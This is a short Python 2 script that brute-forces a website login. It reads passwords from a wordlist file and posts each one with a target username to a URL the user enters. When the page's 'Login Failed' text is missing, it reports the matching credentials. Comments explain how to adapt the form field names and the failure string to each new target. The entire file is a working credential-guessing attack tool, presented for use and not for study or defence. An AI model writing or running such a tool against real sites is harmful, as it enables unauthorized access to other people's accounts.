#!/usr/bin/python

import requests
from termcolor import colored

def bruteForce(url, username):

	for passwd in passwords:
		passwd = passwd.strip()
		print("[!] Trying password : " + passwd)
		
		# this following line needs to be changed for different target URLs according to the names of their respective fields
		data_dict = {"username":username, "password":passwd, "Login":"Submit"}
		response = requests.post(url, data=data_dict)
		
		# the nect line also needs to be changed according to what actually is the "Login Failed" string
		
		if "Login Failed:" in response.content:
			pass
		else:
			print(colored("[+] Successful login with credentials:-", "green"))
			print("[+] Username --> " + username)
			print("[+] Password --> " + passwd)
			exit()
		
page_url = raw_input("[*] Enter the complete URL of the target site: ")
usrname = raw_input("[*] Enter the username of the target: ")

with open("passlist.txt", "r") as passwords:
	bruteForce(page_url, usrname)
	
print(colored("[-] Password not found in current password list!", "red"))

